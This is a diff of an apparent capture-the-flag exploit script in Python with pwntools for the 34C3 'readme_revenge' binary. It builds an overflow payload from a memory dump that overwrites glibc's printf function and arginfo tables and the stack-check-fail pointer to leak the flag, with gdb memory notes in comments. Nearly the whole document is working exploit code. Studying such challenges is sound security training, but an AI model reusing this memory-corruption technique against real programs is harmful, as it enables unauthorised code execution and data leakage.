@@ -2,6 +2,7 @@
 
 import sys
 from pwn import *
+from binascii import unhexlify
 
 """
 $ python -c 'print "A"*3000' | ./readme_revenge
@@ -40,7 +41,49 @@ $3 = 0x73
 """
 
 r = process('./readme_revenge')
+#r = gdb.debug('./readme_revenge', '''
+#b *0x400a3e
+#continue
+#'''
+#)
 
-r.send('babo\n')
+lines = [line.rstrip('\n') for line in open('memdump')]
+
+'''
+gef➤  x __stack_chk_fail
+0x4359b0 <__stack_chk_fail_local>:      0x08ec8348
+hex(ord("s")) == 0x73 ($rdx)
+0x6b7424 * 0x73*8 == 0x6b77bc
+
+gef➤  x/s 0x6b4040
+0x6b4040 <flag>:        "34C3_", 'X' <repeats 30 times>
+'''
+
+'''
+0x6b7980 <__libc_argv>: 0x90    0x79    0x6b    0x00    0x00    0x00    0x00    0x00
+
+0x6b7990 <__gconv_lock>:        0x40    0x40    0x6b    0x00    0x00    0x00    0x00    0x00
+
+0x6b77b8 <_dl_static_dtv+920>:  0x00    0x00    0x00    0x00    0xB0    0x59    0x43    0x00
+0x6b77c0 <_dl_static_dtv+928>:  0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+
+0x6b7a28 <__printf_function_table>:     0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
+
+0x6b7aa8 <__printf_arginfo_table>:      0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
+'''
+
+overwrite = ''
+for l in lines:
+    a = l.split()
+    b = a[-8:]
+    for c in b:
+        d = c.replace('0x','')
+        e = unhexlify(d)
+        if e == '\x09' or e == '\x0a' or e == '\x0b' or e == '\x0c' or e == '\x0d' or e == '\x20':
+            print "[*] Found delimeter 0x%02X" % ord(e)
+            e = '\x41'
+        overwrite += e
+
+r.send(overwrite + '\n')
 
 print (r.recv())
